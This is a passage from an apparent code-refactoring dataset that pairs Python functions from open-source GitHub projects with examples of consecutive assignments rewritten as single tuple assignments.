pyradio,https://github.com/coderholic/pyradio/tree/master/pyradio/config_window.py,PyRadioConfigWindow,_load_default_values$295,"def _load_default_values(self):
        self._config_options['general_title'][1] = ''
        self._config_options['player'][1] = 'mpv,mplayer,vlc'
        self._config_options['open_last_playlist'][1] = 'False'
        self._config_options['default_playlist'][1] = 'stations'
        self._config_options['default_station'][1] = 'False'
        self._config_options['default_encoding'][1] = 'utf-8'
        self._config_options['enable_mouse'][1] = 'False'
        self._config_options['connection_timeout'][1] = '10'
        self._config_options['theme_title'][1] = ''
        ''' Transparency '''
        #self._old_use_transparency = self._config_options['use_transparency'][1]
        self._config_options['use_transparency'][1] = False
        self._config_options['force_http'][1] = False
        self._toggle_transparency_function(changed_from_config_window=True, force_value=False)
        self._config_options['playlist_manngement_title'][1] = ''
        self._config_options['confirm_station_deletion'][1] = True
        self._config_options['confirm_playlist_reload'][1] = True
        self._config_options['auto_save_playlist'][1] = False
        self._config_options['requested_player'][1] = ''
        ''' Theme
            Put this AFTER applying transparency, so that _do_init_pairs in
            _toggle_transparency does not overwrite pairs with applied theme values
        '''
        self._config_options['theme'][1] = 'dark'
        self._apply_a_theme('dark', False)
        self._check_if_config_is_dirty()","self._config_options['playlist_manngement_title'][1] = ''
self._config_options['confirm_station_deletion'][1] = True
self._config_options['confirm_playlist_reload'][1] = True
self._config_options['auto_save_playlist'][1] = False
self._config_options['requested_player'][1] = ''","self._config_options['playlist_manngement_title'][1] , self._config_options['confirm_station_deletion'][1] , self._config_options['confirm_playlist_reload'][1] , self._config_options['auto_save_playlist'][1] , self._config_options['requested_player'][1]  = '', True, True, False, ''"
eliot,https://github.com/itamarst/eliot/tree/master/eliot/tests/test_twisted.py,DeferredContextTests,test_addActionFinishSuccess$248,"def test_addActionFinishSuccess(self):
        """"""
        When the L{Deferred} referred to by L{DeferredContext.addActionFinish}
        fires successfully, a finish message is logged.
        """"""
        d = Deferred()
        logger = MemoryLogger()
        action = Action(logger, ""uuid"", TaskLevel(level=[1]), ""sys:me"")
        with action.context():
            DeferredContext(d).addActionFinish()
        d.callback(""result"")
        assertContainsFields(
            self,
            logger.messages[0],
            {
                ""task_uuid"": ""uuid"",
                ""task_level"": [1, 1],
                ""action_type"": ""sys:me"",
                ""action_status"": ""succeeded"",
            },
        )","d = Deferred()
logger = MemoryLogger()","d , logger  = Deferred(), MemoryLogger()"
formspree,https://github.com/formspree/formspree/tree/master/formspree/forms/models.py,Form,submissions_with_fields$157,"def submissions_with_fields(self):
        '''
        Fetch all submissions, extract all fields names from every submission
        into a single fields list, excluding the KEYS_NOT_STORED values, because
        they are worthless.
        Add the special 'date' field to every submission entry, based on
        .submitted_at, and use this as the first field on the fields array.
        '''

        fields = set()
        submissions = []
        for s in self.submissions:
            data = s.data.copy()
            fields.update(data.keys())
            data[""date""] = s.submitted_at.isoformat()
            data[""id""] = s.id
            for k in KEYS_NOT_STORED:
                data.pop(k, None)
            submissions.append(data)

        fields = ['date'] + sorted(fields - KEYS_NOT_STORED)
        return submissions, fields","fields = set()
submissions = []","fields , submissions  = set(), []"
formspree,https://github.com/formspree/formspree/tree/master/formspree/forms/models.py,Form,submissions_with_fields$157,"def submissions_with_fields(self):
        '''
        Fetch all submissions, extract all fields names from every submission
        into a single fields list, excluding the KEYS_NOT_STORED values, because
        they are worthless.
        Add the special 'date' field to every submission entry, based on
        .submitted_at, and use this as the first field on the fields array.
        '''

        fields = set()
        submissions = []
        for s in self.submissions:
            data = s.data.copy()
            fields.update(data.keys())
            data[""date""] = s.submitted_at.isoformat()
            data[""id""] = s.id
            for k in KEYS_NOT_STORED:
                data.pop(k, None)
            submissions.append(data)

        fields = ['date'] + sorted(fields - KEYS_NOT_STORED)
        return submissions, fields","data['date'] = s.submitted_at.isoformat()
data['id'] = s.id","data['date'] , data['id']  = s.submitted_at.isoformat(), s.id"
django-user-accounts,https://github.com/pinax/django-user-accounts/tree/master/account/tests/test_auth.py,UsernameAuthenticationBackendTestCase,test_successful_auth_django_2_1$32,"def test_successful_auth_django_2_1(self):
        created_user = self.create_user(""user1"", ""user1@example.com"", ""password"")
        request = None
        authed_user = authenticate(request, username=""user1"", password=""password"")
        self.assertTrue(authed_user is not None)
        self.assertEqual(created_user.pk, authed_user.pk)","created_user = self.create_user('user1', 'user1@example.com', 'password')
request = None","created_user , request  = self.create_user('user1', 'user1@example.com', 'password'), None"
luna,https://github.com/greatscottgadgets/luna/tree/master/luna/gateware/usb/usb3/application/request.py,SuperSpeedRequestHandlerMultiplexer,_multiplex_signals$288,"def _multiplex_signals(self, m, *, when, multiplex, sub_bus=None):
        """""" Helper that creates a simple priority-encoder multiplexer.

        Parmeters:
            when      -- The name of the interface signal that indicates that the `multiplex` signals
                         should be selected for output. If this signals should be multiplex, it
                         should be included in `multiplex`.
            multiplex -- The names of the interface signals to be multiplexed.
        """"""

        def get_signal(interface, name):
            """""" Fetches an interface signal by name / sub_bus. """"""

            if sub_bus:
                bus = getattr(interface, sub_bus)
                return getattr(bus, name)
            else:
                return  getattr(interface, name)


        # We're building an if-elif tree; so we should start with an If entry.
        conditional = m.If

        for interface in self._interfaces:
            condition = get_signal(interface, when)

            with conditional(condition):

                # Connect up each of our signals.
                for signal_name in multiplex:

                    # Get the actual signals for our input and output...
                    driving_signal = get_signal(interface,   signal_name)
                    target_signal  = get_signal(self.shared, signal_name)

                    # ... and connect them.
                    m.d.comb += target_signal   .eq(driving_signal)

            # After the first element, all other entries should be created with Elif.
            conditional = m.Elif","driving_signal = get_signal(interface, signal_name)
target_signal = get_signal(self.shared, signal_name)","driving_signal , target_signal  = get_signal(interface, signal_name), get_signal(self.shared, signal_name)"
plaso,https://github.com/log2timeline/plaso/tree/master/plaso/containers/event_sources.py,EventSource,__init__$28,"def __init__(self, file_entry_type=None, path_spec=None):
    """"""Initializes an event source.

    Args:
      file_entry_type (Optional[str]): dfVFS file entry type.
      path_spec (Optional[dfvfs.PathSpec]): path specification.
    """"""
    super(EventSource, self).__init__()
    self.data_type = self.DATA_TYPE
    self.file_entry_type = file_entry_type
    self.path_spec = path_spec","self.data_type = self.DATA_TYPE
self.file_entry_type = file_entry_type
self.path_spec = path_spec","self.data_type , self.file_entry_type , self.path_spec  = self.DATA_TYPE, file_entry_type, path_spec"
pgmpy,https://github.com/pgmpy/pgmpy/tree/master/pgmpy/tests/test_models/test_MarkovModel.py,TestUndirectedGraphTriangulation,test_triangulation_h6_inplace$449,"def test_triangulation_h6_inplace(self):
        self.graph.add_edges_from([(""a"", ""b""), (""b"", ""c""), (""c"", ""d""), (""d"", ""a"")])
        phi1 = DiscreteFactor([""a"", ""b""], [2, 3], np.random.rand(6))
        phi2 = DiscreteFactor([""b"", ""c""], [3, 4], np.random.rand(12))
        phi3 = DiscreteFactor([""c"", ""d""], [4, 5], np.random.rand(20))
        phi4 = DiscreteFactor([""d"", ""a""], [5, 2], np.random.random(10))
        self.graph.add_factors(phi1, phi2, phi3, phi4)
        self.graph.triangulate(heuristic=""H4"", inplace=True)
        self.assertTrue(self.graph.is_triangulated())
        self.assertListEqual(
            hf.recursive_sorted(self.graph.edges()),
            [[""a"", ""b""], [""a"", ""d""], [""b"", ""c""], [""b"", ""d""], [""c"", ""d""]],
        )","phi1 = DiscreteFactor(['a', 'b'], [2, 3], np.random.rand(6))
phi2 = DiscreteFactor(['b', 'c'], [3, 4], np.random.rand(12))
phi3 = DiscreteFactor(['c', 'd'], [4, 5], np.random.rand(20))
phi4 = DiscreteFactor(['d', 'a'], [5, 2], np.random.random(10))","phi1 , phi2 , phi3 , phi4  = DiscreteFactor(['a', 'b'], [2, 3], np.random.rand(6)), DiscreteFactor(['b', 'c'], [3, 4], np.random.rand(12)), DiscreteFactor(['c', 'd'], [4, 5], np.random.rand(20)), DiscreteFactor(['d', 'a'], [5, 2], np.random.random(10))"
freeipa,https://github.com/freeipa/freeipa/tree/master/ipatests/test_integration/test_dns_locations.py,TestDNSLocations,test_change_weight$388,"def test_change_weight(self):
        """"""Change weight of master and test if records changed properly
        """"""

        new_weight = 2000

        self.master.run_command([
            'ipa', 'server-mod', self.master.hostname, '--service-weight',
            str(new_weight)
        ])

        # all servers must be restarted
        tasks.restart_named(self.master, self.replicas[0], self.replicas[1])

        servers_prague_loc = (
            (self.PRIO_LOW, new_weight, DNSName(self.master.hostname)),
            (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[0].hostname)),
            (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[1].hostname)),
        )
        domain_prague_loc = (
            DNSName('{}._locations'.format(self.LOC_PRAGUE)) + DNSName(
                self.master.domain.name).make_absolute())

        servers_paris_loc = (
            (self.PRIO_HIGH, new_weight, DNSName(self.master.hostname)),
            (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[0].hostname)),
            (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[1].hostname)),
        )
        domain_paris_loc = (
            DNSName('{}._locations'.format(self.LOC_PARIS)) + DNSName(
                self.master.domain.name).make_absolute())

        self._test_SRV_rec_against_server(
            self.replicas[0].ip, domain_prague_loc, servers_prague_loc
        )
        self._test_URI_rec_against_server(
            self.replicas[0].ip, domain_prague_loc, servers_prague_loc
        )

        for ip in (self.replicas[1].ip, self.master.ip):
            self._test_SRV_rec_against_server(
                ip, domain_paris_loc, servers_paris_loc
            )
            self._test_URI_rec_against_server(
                ip, domain_paris_loc, servers_paris_loc
            )","servers_prague_loc = ((self.PRIO_LOW, new_weight, DNSName(self.master.hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[1].hostname)))
domain_prague_loc = DNSName('{}._locations'.format(self.LOC_PRAGUE)) + DNSName(self.master.domain.name).make_absolute()
servers_paris_loc = ((self.PRIO_HIGH, new_weight, DNSName(self.master.hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[1].hostname)))
domain_paris_loc = DNSName('{}._locations'.format(self.LOC_PARIS)) + DNSName(self.master.domain.name).make_absolute()","servers_prague_loc , domain_prague_loc , servers_paris_loc , domain_paris_loc  = ((self.PRIO_LOW, new_weight, DNSName(self.master.hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[1].hostname))), DNSName('{}._locations'.format(self.LOC_PRAGUE)) + DNSName(self.master.domain.name).make_absolute(), ((self.PRIO_HIGH, new_weight, DNSName(self.master.hostname)), (self.PRIO_LOW, self.WEIGHT, DNSName(self.replicas[0].hostname)), (self.PRIO_HIGH, self.WEIGHT, DNSName(self.replicas[1].hostname))), DNSName('{}._locations'.format(self.LOC_PARIS)) + DNSName(self.master.domain.name).make_absolute()"
networkx,https://github.com/networkx/networkx/tree/master/networkx/algorithms/centrality/tests/test_katz_centrality.py,TestKatzCentralityNumpy,test_P3_unweighted$234,"def test_P3_unweighted(self):
        """"""Katz centrality: P3""""""
        alpha = 0.1
        G = nx.path_graph(3)
        b_answer = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}
        b = nx.katz_centrality_numpy(G, alpha, weight=None)
        for n in sorted(G):
            assert b[n] == pytest.approx(b_answer[n], abs=1e-4)","alpha = 0.1
G = nx.path_graph(3)","alpha , G  = 0.1, nx.path_graph(3)"
networkx,https://github.com/networkx/networkx/tree/master/networkx/algorithms/centrality/tests/test_katz_centrality.py,TestKatzCentralityNumpy,test_P3_unweighted$234,"def test_P3_unweighted(self):
        """"""Katz centrality: P3""""""
        alpha = 0.1
        G = nx.path_graph(3)
        b_answer = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}
        b = nx.katz_centrality_numpy(G, alpha, weight=None)
        for n in sorted(G):
            assert b[n] == pytest.approx(b_answer[n], abs=1e-4)","b_answer = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}
b = nx.katz_centrality_numpy(G, alpha, weight=None)","b_answer , b  = {0: 0.5598852584152165, 1: 0.6107839182711449, 2: 0.5598852584152162}, nx.katz_centrality_numpy(G, alpha, weight=None)"
growlab,https://github.com/alexellis/growlab/tree/master/app/camera.py,camera,get_frame$9,"def get_frame(self):
        stream = io.BytesIO()
        with picamera.PiCamera() as camera:
            camera.start_preview()
            camera.vflip = self.camera_opts[""vertical_flip""]
            camera.hflip = self.camera_opts[""horizontal_flip""]
            camera.meter_mode = self.camera_opts[""meter_mode""]
            camera.exposure_mode = ""auto""
            camera.resolution = (self.camera_opts[""width""], self.camera_opts[""height""])
            # Camera warm-up time
            time.sleep(self.camera_opts[""preview_seconds""])
            camera.capture(stream, format=self.camera_opts[""encoding""], quality=self.camera_opts[""image_quality""])

        return stream","camera.vflip = self.camera_opts['vertical_flip']
camera.hflip = self.camera_opts['horizontal_flip']
camera.meter_mode = self.camera_opts['meter_mode']
camera.exposure_mode = 'auto'
camera.resolution = (self.camera_opts['width'], self.camera_opts['height'])","camera.vflip , camera.hflip , camera.meter_mode , camera.exposure_mode , camera.resolution  = self.camera_opts['vertical_flip'], self.camera_opts['horizontal_flip'], self.camera_opts['meter_mode'], 'auto', (self.camera_opts['width'], self.camera_opts['height'])"
GPflow,https://github.com/GPflow/GPflow/tree/master/gpflow/kernels/changepoints.py,ChangePoints,_sigmoids$167,"def _sigmoids(self, X: tf.Tensor) -> tf.Tensor:
        locations = tf.sort(self.locations)  # ensure locations are ordered
        locations = tf.reshape(locations, (-1,))
        steepness = tf.reshape(self.steepness, (-1,))
        return tf.sigmoid(steepness * (X[..., None] - locations))","locations = tf.reshape(locations, (-1,))
steepness = tf.reshape(self.steepness, (-1,))","locations , steepness  = tf.reshape(locations, (-1,)), tf.reshape(self.steepness, (-1,))"
rllab,https://github.com/rll/rllab/tree/master/rllab/envs/box2d/parser/xml_box2d.py,XmlWorld,to_box2d$58,"def to_box2d(self, extra_data, world=None):
        if world is None:
            world = Box2D.b2World(allow_sleeping=False)
        world.warmStarting = self.warmStarting
        world.continuousPhysics = self.continuousPhysics
        world.subStepping = self.subStepping
        extra_data.velocityIterations = self.velocityIterations
        extra_data.positionIterations = self.positionIterations
        extra_data.timeStep = self.timeStep
        if self.gravity:
            world.gravity = self.gravity
        for body in self.bodies:
            body.to_box2d(world, self, extra_data)
        for joint in self.joints:
            joint.to_box2d(world, self, extra_data)
        for state in self.states:
            state.to_box2d(world, self, extra_data)
        for control in self.controls:
            control.to_box2d(world, self, extra_data)
        return world","world.warmStarting = self.warmStarting
world.continuousPhysics = self.continuousPhysics
world.subStepping = self.subStepping
extra_data.velocityIterations = self.velocityIterations
extra_data.positionIterations = self.positionIterations
extra_data.timeStep = self.timeStep","world.warmStarting , world.continuousPhysics , world.subStepping , extra_data.velocityIterations , extra_data.positionIterations , extra_data.timeStep  = self.warmStarting, self.continuousPhysics, self.subStepping, self.velocityIterations, self.positionIterations, self.timeStep"
cleanlab,https://github.com/cleanlab/cleanlab/tree/master/examples/mnist/label_errors_mnist_train_cnn.py,,imshow$77,"def imshow(inp, img_labels=None, img_pred=None, img_fns = None, figsize=(10,10), normalize=False, method_name = '', savefig = False):
    """"""Imshow for Tensor.""""""
    height, width = inp.shape[1:]
    xbins = 8
    ybins = int(np.ceil(len(img_labels)/xbins))
    xbin_width = width // xbins
    ybin_height = height // ybins
    
    inp = inp.numpy().transpose((1, 2, 0))
    if normalize:
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        inp = std * inp + mean
        inp = np.clip(inp, 0, 1)
    
    ax = plt.figure(figsize=figsize).gca()
    ax.imshow(inp)
    pad_size = (8-len(img_pred)%8)%8
    img_labels = img_labels + ['']*pad_size #padding
    img_pred = img_pred + ['']*pad_size #padding
    img_fns = img_fns + ['']*pad_size #padding
#     grid = np.asarray(img_labels).reshape((ybins, xbins))
       
    num_red_boxes = 0
    for (j,i),idx in np.ndenumerate(np.arange(ybins*xbins).reshape((ybins, xbins))):
        prediction = img_pred[idx]
        label = img_labels[idx]
        img_fn = img_fns[idx]
        image_index = int(img_fn[13:])
        
        plt.hlines([j*ybin_height - .5], xmin=i*xbin_width, xmax=i*xbin_width + xbin_width, color = 'lightgray', linewidth=2)
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(prediction)), 12) if prediction != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/20,prediction,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lime', alpha=0.8, edgecolor=None))
        
        fontsize=min(.5*figsize[0], 1.25*figsize[0]-len(img_fn)) if img_fn != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2.8,j*ybin_height + ybin_height/7,img_fn,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lightgray', alpha=0.8, edgecolor=None))
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(label)),12) if label != '' else 1
        t = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/10*9,label,ha='center',va='center', fontsize=fontsize)
        t.set_bbox(dict(facecolor='cyan', alpha=0.8, edgecolor=None))
        
        
        if image_index in [21601, 40466, 29922, 40144, 51248, 43454, 59915, 57662, 25678, 2676, 24798, 31727, 7080, 26560, 10994, 53396, 54264]:#, 59701, 42566, 26940, 47759
            # Draw red bounding box
            plt.hlines([j*ybin_height + 0.5,(j+1)*ybin_height - 1.5], xmin=i*xbin_width - 0.3, xmax=i*xbin_width + xbin_width - 0.65, color = 'red', linewidth=15)
            plt.vlines([i*xbin_width + 0.5,(i+1)*xbin_width - 1.5], ymin=j*ybin_height + 0.5, ymax=j*ybin_height + ybin_height - 0.5, color = 'red', linewidth=15)
            num_red_boxes += 1
    
    print(""Number of red boxes:"", num_red_boxes)
    plt.axis('off')
    if savefig:
        plt.savefig('figs/mnist_training_label_errors'+str(len(img_pred))+""_""+method_name+'.pdf', pad_inches=0.0, bbox_inches='tight')
    plt.pause(0.001)","xbin_width = width // xbins
ybin_height = height // ybins
inp = inp.numpy().transpose((1, 2, 0))","xbin_width , ybin_height , inp  = width // xbins, height // ybins, inp.numpy().transpose((1, 2, 0))"
cleanlab,https://github.com/cleanlab/cleanlab/tree/master/examples/mnist/label_errors_mnist_train_cnn.py,,imshow$77,"def imshow(inp, img_labels=None, img_pred=None, img_fns = None, figsize=(10,10), normalize=False, method_name = '', savefig = False):
    """"""Imshow for Tensor.""""""
    height, width = inp.shape[1:]
    xbins = 8
    ybins = int(np.ceil(len(img_labels)/xbins))
    xbin_width = width // xbins
    ybin_height = height // ybins
    
    inp = inp.numpy().transpose((1, 2, 0))
    if normalize:
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        inp = std * inp + mean
        inp = np.clip(inp, 0, 1)
    
    ax = plt.figure(figsize=figsize).gca()
    ax.imshow(inp)
    pad_size = (8-len(img_pred)%8)%8
    img_labels = img_labels + ['']*pad_size #padding
    img_pred = img_pred + ['']*pad_size #padding
    img_fns = img_fns + ['']*pad_size #padding
#     grid = np.asarray(img_labels).reshape((ybins, xbins))
       
    num_red_boxes = 0
    for (j,i),idx in np.ndenumerate(np.arange(ybins*xbins).reshape((ybins, xbins))):
        prediction = img_pred[idx]
        label = img_labels[idx]
        img_fn = img_fns[idx]
        image_index = int(img_fn[13:])
        
        plt.hlines([j*ybin_height - .5], xmin=i*xbin_width, xmax=i*xbin_width + xbin_width, color = 'lightgray', linewidth=2)
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(prediction)), 12) if prediction != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/20,prediction,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lime', alpha=0.8, edgecolor=None))
        
        fontsize=min(.5*figsize[0], 1.25*figsize[0]-len(img_fn)) if img_fn != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2.8,j*ybin_height + ybin_height/7,img_fn,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lightgray', alpha=0.8, edgecolor=None))
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(label)),12) if label != '' else 1
        t = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/10*9,label,ha='center',va='center', fontsize=fontsize)
        t.set_bbox(dict(facecolor='cyan', alpha=0.8, edgecolor=None))
        
        
        if image_index in [21601, 40466, 29922, 40144, 51248, 43454, 59915, 57662, 25678, 2676, 24798, 31727, 7080, 26560, 10994, 53396, 54264]:#, 59701, 42566, 26940, 47759
            # Draw red bounding box
            plt.hlines([j*ybin_height + 0.5,(j+1)*ybin_height - 1.5], xmin=i*xbin_width - 0.3, xmax=i*xbin_width + xbin_width - 0.65, color = 'red', linewidth=15)
            plt.vlines([i*xbin_width + 0.5,(i+1)*xbin_width - 1.5], ymin=j*ybin_height + 0.5, ymax=j*ybin_height + ybin_height - 0.5, color = 'red', linewidth=15)
            num_red_boxes += 1
    
    print(""Number of red boxes:"", num_red_boxes)
    plt.axis('off')
    if savefig:
        plt.savefig('figs/mnist_training_label_errors'+str(len(img_pred))+""_""+method_name+'.pdf', pad_inches=0.0, bbox_inches='tight')
    plt.pause(0.001)","img_labels = img_labels + [''] * pad_size
img_pred = img_pred + [''] * pad_size
img_fns = img_fns + [''] * pad_size
num_red_boxes = 0","img_labels , img_pred , img_fns , num_red_boxes  = img_labels + [''] * pad_size, img_pred + [''] * pad_size, img_fns + [''] * pad_size, 0"
cleanlab,https://github.com/cleanlab/cleanlab/tree/master/examples/mnist/label_errors_mnist_train_cnn.py,,imshow$77,"def imshow(inp, img_labels=None, img_pred=None, img_fns = None, figsize=(10,10), normalize=False, method_name = '', savefig = False):
    """"""Imshow for Tensor.""""""
    height, width = inp.shape[1:]
    xbins = 8
    ybins = int(np.ceil(len(img_labels)/xbins))
    xbin_width = width // xbins
    ybin_height = height // ybins
    
    inp = inp.numpy().transpose((1, 2, 0))
    if normalize:
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        inp = std * inp + mean
        inp = np.clip(inp, 0, 1)
    
    ax = plt.figure(figsize=figsize).gca()
    ax.imshow(inp)
    pad_size = (8-len(img_pred)%8)%8
    img_labels = img_labels + ['']*pad_size #padding
    img_pred = img_pred + ['']*pad_size #padding
    img_fns = img_fns + ['']*pad_size #padding
#     grid = np.asarray(img_labels).reshape((ybins, xbins))
       
    num_red_boxes = 0
    for (j,i),idx in np.ndenumerate(np.arange(ybins*xbins).reshape((ybins, xbins))):
        prediction = img_pred[idx]
        label = img_labels[idx]
        img_fn = img_fns[idx]
        image_index = int(img_fn[13:])
        
        plt.hlines([j*ybin_height - .5], xmin=i*xbin_width, xmax=i*xbin_width + xbin_width, color = 'lightgray', linewidth=2)
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(prediction)), 12) if prediction != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/20,prediction,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lime', alpha=0.8, edgecolor=None))
        
        fontsize=min(.5*figsize[0], 1.25*figsize[0]-len(img_fn)) if img_fn != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2.8,j*ybin_height + ybin_height/7,img_fn,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lightgray', alpha=0.8, edgecolor=None))
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(label)),12) if label != '' else 1
        t = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/10*9,label,ha='center',va='center', fontsize=fontsize)
        t.set_bbox(dict(facecolor='cyan', alpha=0.8, edgecolor=None))
        
        
        if image_index in [21601, 40466, 29922, 40144, 51248, 43454, 59915, 57662, 25678, 2676, 24798, 31727, 7080, 26560, 10994, 53396, 54264]:#, 59701, 42566, 26940, 47759
            # Draw red bounding box
            plt.hlines([j*ybin_height + 0.5,(j+1)*ybin_height - 1.5], xmin=i*xbin_width - 0.3, xmax=i*xbin_width + xbin_width - 0.65, color = 'red', linewidth=15)
            plt.vlines([i*xbin_width + 0.5,(i+1)*xbin_width - 1.5], ymin=j*ybin_height + 0.5, ymax=j*ybin_height + ybin_height - 0.5, color = 'red', linewidth=15)
            num_red_boxes += 1
    
    print(""Number of red boxes:"", num_red_boxes)
    plt.axis('off')
    if savefig:
        plt.savefig('figs/mnist_training_label_errors'+str(len(img_pred))+""_""+method_name+'.pdf', pad_inches=0.0, bbox_inches='tight')
    plt.pause(0.001)","mean = np.array([0.485, 0.456, 0.406])
std = np.array([0.229, 0.224, 0.225])","mean , std  = np.array([0.485, 0.456, 0.406]), np.array([0.229, 0.224, 0.225])"
cleanlab,https://github.com/cleanlab/cleanlab/tree/master/examples/mnist/label_errors_mnist_train_cnn.py,,imshow$77,"def imshow(inp, img_labels=None, img_pred=None, img_fns = None, figsize=(10,10), normalize=False, method_name = '', savefig = False):
    """"""Imshow for Tensor.""""""
    height, width = inp.shape[1:]
    xbins = 8
    ybins = int(np.ceil(len(img_labels)/xbins))
    xbin_width = width // xbins
    ybin_height = height // ybins
    
    inp = inp.numpy().transpose((1, 2, 0))
    if normalize:
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        inp = std * inp + mean
        inp = np.clip(inp, 0, 1)
    
    ax = plt.figure(figsize=figsize).gca()
    ax.imshow(inp)
    pad_size = (8-len(img_pred)%8)%8
    img_labels = img_labels + ['']*pad_size #padding
    img_pred = img_pred + ['']*pad_size #padding
    img_fns = img_fns + ['']*pad_size #padding
#     grid = np.asarray(img_labels).reshape((ybins, xbins))
       
    num_red_boxes = 0
    for (j,i),idx in np.ndenumerate(np.arange(ybins*xbins).reshape((ybins, xbins))):
        prediction = img_pred[idx]
        label = img_labels[idx]
        img_fn = img_fns[idx]
        image_index = int(img_fn[13:])
        
        plt.hlines([j*ybin_height - .5], xmin=i*xbin_width, xmax=i*xbin_width + xbin_width, color = 'lightgray', linewidth=2)
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(prediction)), 12) if prediction != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/20,prediction,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lime', alpha=0.8, edgecolor=None))
        
        fontsize=min(.5*figsize[0], 1.25*figsize[0]-len(img_fn)) if img_fn != '' else 1
        tt = ax.text(i*xbin_width + xbin_width/2.8,j*ybin_height + ybin_height/7,img_fn,ha='center',va='center', fontsize=fontsize)
        tt.set_bbox(dict(facecolor='lightgray', alpha=0.8, edgecolor=None))
        
        fontsize=max(min(1.4*figsize[0], .9*figsize[0]-.7*len(label)),12) if label != '' else 1
        t = ax.text(i*xbin_width + xbin_width/2,j*ybin_height + ybin_height/10*9,label,ha='center',va='center', fontsize=fontsize)
        t.set_bbox(dict(facecolor='cyan', alpha=0.8, edgecolor=None))
        
        
        if image_index in [21601, 40466, 29922, 40144, 51248, 43454, 59915, 57662, 25678, 2676, 24798, 31727, 7080, 26560, 10994, 53396, 54264]:#, 59701, 42566, 26940, 47759
            # Draw red bounding box
            plt.hlines([j*ybin_height + 0.5,(j+1)*ybin_height - 1.5], xmin=i*xbin_width - 0.3, xmax=i*xbin_width + xbin_width - 0.65, color = 'red', linewidth=15)
            plt.vlines([i*xbin_width + 0.5,(i+1)*xbin_width - 1.5], ymin=j*ybin_height + 0.5, ymax=j*ybin_height + ybin_height - 0.5, color = 'red', linewidth=15)
            num_red_boxes += 1
    
    print(""Number of red boxes:"", num_red_boxes)
    plt.axis('off')
    if savefig:
        plt.savefig('figs/mnist_training_label_errors'+str(len(img_pred))+""_""+method_name+'.pdf', pad_inches=0.0, bbox_inches='tight')
    plt.pause(0.001)","prediction = img_pred[idx]
label = img_labels[idx]
img_fn = img_fns[idx]","prediction , label , img_fn  = img_pred[idx], img_labels[idx], img_fns[idx]"
muzic,https://github.com/microsoft/muzic/tree/master/deeprapper/tokenizations/tokenization_bert_word_level.py,BasicTokenizer,tokenize$230,"def tokenize(self, text, never_split=None):
        """""" Basic Tokenization of a piece of text.
            Split on ""white spaces"" only, for sub-word tokenization, see WordPieceTokenizer.

        Args:
            **never_split**: (`optional`) list of str
                Kept for backward compatibility purposes.
                Now implemented directly at the base class level (see :func:`PreTrainedTokenizer.tokenize`)
                List of token not to split.
        """"""
        never_split = self.never_split + (never_split if never_split is not None else [])
        text = self._clean_text(text)
        # This was added on November 1st, 2018 for the multilingual and Chinese
        # models. This is also applied to the English models now, but it doesn't
        # matter since the English models were not trained on any Chinese data
        # and generally don't have any Chinese data in them (there are Chinese
        # characters in the vocabulary because Wikipedia does have some Chinese
        # words in the English Wikipedia.).
        if self.tokenize_chinese_chars:
            text = self._tokenize_chinese_chars(text)
        orig_tokens = whitespace_tokenize(text)
        split_tokens = []
        for token in orig_tokens:
            if self.do_lower_case and token not in never_split:
                token = token.lower()
                token = self._run_strip_accents(token)
            split_tokens.extend(self._run_split_on_punc(token))

        output_tokens = whitespace_tokenize("" "".join(split_tokens))
        return output_tokens","never_split = self.never_split + (never_split if never_split is not None else [])
text = self._clean_text(text)","never_split , text  = self.never_split + (never_split if never_split is not None else []), self._clean_text(text)"
muzic,https://github.com/microsoft/muzic/tree/master/deeprapper/tokenizations/tokenization_bert_word_level.py,BasicTokenizer,tokenize$230,"def tokenize(self, text, never_split=None):
        """""" Basic Tokenization of a piece of text.
            Split on ""white spaces"" only, for sub-word tokenization, see WordPieceTokenizer.
